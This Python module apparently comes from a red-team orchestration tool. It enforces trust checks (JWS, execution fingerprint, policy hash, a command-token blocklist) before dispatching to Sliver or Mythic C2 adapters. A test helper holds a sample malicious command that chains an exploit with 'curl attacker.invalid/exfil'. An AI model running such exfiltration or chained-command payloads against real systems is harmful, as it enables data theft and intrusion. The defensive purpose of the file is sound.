# Copyright (c) 2026 NyxeraLabs
# Author: Jose Maria Micoli
# Licensed under BSL 1.1
# Change Date: 2033-02-22 -> Apache-2.0
#
# You may:
# Study
# Modify
# Use for internal security testing
#
# You may NOT:
# Offer as a commercial service
# Sell derived competing products

"""Phase 7 Sprint 28 C2 adapter trust enforcement boundary."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable

from pkg.orchestrator.execution_fingerprint import (
    ExecutionFingerprintInput,
    ExecutionFingerprintError,
    generate_operator_bound_execution_fingerprint,
)
from pkg.runner.jws_verify import JWSVerificationError, RunnerJWSVerifier

C2AdapterCallable = Callable[[dict[str, Any]], dict[str, Any]]


class C2AdapterHardeningError(ValueError):
    """Raised when hardened C2 adapter boundary checks fail."""


@dataclass(slots=True, frozen=True)
class C2DispatchBundle:
    """Trusted dispatch bundle presented to hardened C2 boundary."""

    adapter_name: str
    compact_jws: str
    execution_fingerprint: str
    manifest_hash: str
    tool_hash: str
    operator_id: str
    tenant_id: str
    policy_decision_hash: str
    timestamp: str
    target: str
    payload: dict[str, Any] = field(default_factory=dict)


@dataclass(slots=True, frozen=True)
class HardenedExecutionBoundaryConfig:
    """Hardened C2 boundary configuration for adapter isolation."""

    allowed_adapters: tuple[str, ...] = ("sliver", "mythic")
    blocked_command_tokens: tuple[str, ...] = (";", "&&", "||", "|", "`", "$(", "..")
    max_payload_items: int = 64

    def validate(self) -> None:
        if not self.allowed_adapters:
            raise C2AdapterHardeningError("allowed_adapters must not be empty")
        if self.max_payload_items < 1:
            raise C2AdapterHardeningError("max_payload_items must be >= 1")


def simulate_malicious_adapter_payload() -> dict[str, Any]:
    """Generate malicious payload sample for trust-boundary simulation tests."""
    return {
        "command": "run exploit && curl attacker.invalid/exfil",
        "target": "10.0.0.5",
        "mode": "priv-escape",
    }


class HardenedC2AdapterBoundary:
    """Dispatch boundary enforcing zero-trust checks before C2 adapter execution."""

    def __init__(
        self,
        *,
        adapters: dict[str, C2AdapterCallable],
        jws_verifier: RunnerJWSVerifier | None = None,
        config: HardenedExecutionBoundaryConfig | None = None,
    ) -> None:
        self._adapters = dict(adapters)
        self._jws_verifier = jws_verifier or RunnerJWSVerifier()
        self._config = config or HardenedExecutionBoundaryConfig()
        self._config.validate()

    def dispatch(
        self,
        *,
        bundle: C2DispatchBundle,
        hmac_secret: str | None = None,
        public_key_pem: str | None = None,
    ) -> dict[str, Any]:
        """Verify trust controls, then dispatch into isolated adapter boundary."""
        self._enforce_hardened_boundary(bundle)
        jws_payload = self._verify_jws(
            compact_jws=bundle.compact_jws,
            hmac_secret=hmac_secret,
            public_key_pem=public_key_pem,
        )
        self._bind_dispatch_to_execution_fingerprint(bundle, jws_payload)
        self._enforce_policy_hash_validation(bundle, jws_payload)

        adapter = self._adapters.get(bundle.adapter_name)
        if adapter is None:
            raise C2AdapterHardeningError("adapter not registered in boundary")
        response = adapter(dict(bundle.payload))
        if not isinstance(response, dict):
            raise C2AdapterHardeningError("adapter response must be a dictionary")
        return response

    def _verify_jws(
        self,
        *,
        compact_jws: str,
        hmac_secret: str | None,
        public_key_pem: str | None,
    ) -> dict[str, Any]:
        try:
            return self._jws_verifier.verify(
                compact_jws=compact_jws,
                hmac_secret=hmac_secret,
                public_key_pem=public_key_pem,
            )
        except JWSVerificationError as exc:
            raise C2AdapterHardeningError("JWS verification failed at adapter boundary") from exc

    def _bind_dispatch_to_execution_fingerprint(
        self,
        bundle: C2DispatchBundle,
        jws_payload: dict[str, Any],
    ) -> None:
        try:
            expected = generate_operator_bound_execution_fingerprint(
                data=ExecutionFingerprintInput(
                    manifest_hash=bundle.manifest_hash,
                    tool_hash=bundle.tool_hash,
                    operator_id=bundle.operator_id,
                    tenant_id=bundle.tenant_id,
                    policy_decision_hash=bundle.policy_decision_hash,
                    attestation_measurement_hash=str(
                        jws_payload.get("attestation_measurement_hash", "")
                    ).strip(),
                    timestamp=bundle.timestamp,
                ),
                operator_id=bundle.operator_id,
            )
        except ExecutionFingerprintError as exc:
            raise C2AdapterHardeningError("invalid execution fingerprint input") from exc

        provided = bundle.execution_fingerprint.strip().lower()
        jws_fp = str(jws_payload.get("execution_fingerprint", "")).strip().lower()
        if not provided or provided != expected or jws_fp != expected:
            raise C2AdapterHardeningError(
                "execution fingerprint binding check failed at C2 boundary"
            )

    def _enforce_policy_hash_validation(
        self,
        bundle: C2DispatchBundle,
        jws_payload: dict[str, Any],
    ) -> None:
        jws_policy_hash = str(jws_payload.get("policy_decision_hash", "")).strip()
        if not bundle.policy_decision_hash.strip() or not jws_policy_hash:
            raise C2AdapterHardeningError("policy_decision_hash is required at boundary")
        if jws_policy_hash != bundle.policy_decision_hash:
            raise C2AdapterHardeningError("policy hash mismatch at C2 boundary")

    def _enforce_hardened_boundary(self, bundle: C2DispatchBundle) -> None:
        if bundle.adapter_name not in self._config.allowed_adapters:
            raise C2AdapterHardeningError("adapter is outside hardened execution boundary")
        if bundle.adapter_name not in self._adapters:
            raise C2AdapterHardeningError("adapter not registered in hardened boundary")
        if len(bundle.payload) > self._config.max_payload_items:
            raise C2AdapterHardeningError("payload exceeds hardened boundary limits")

        for value in bundle.payload.values():
            if not isinstance(value, str):
                continue
            for token in self._config.blocked_command_tokens:
                if token in value:
                    raise C2AdapterHardeningError(
                        "malicious adapter behavior detected at hardened boundary"
                    )
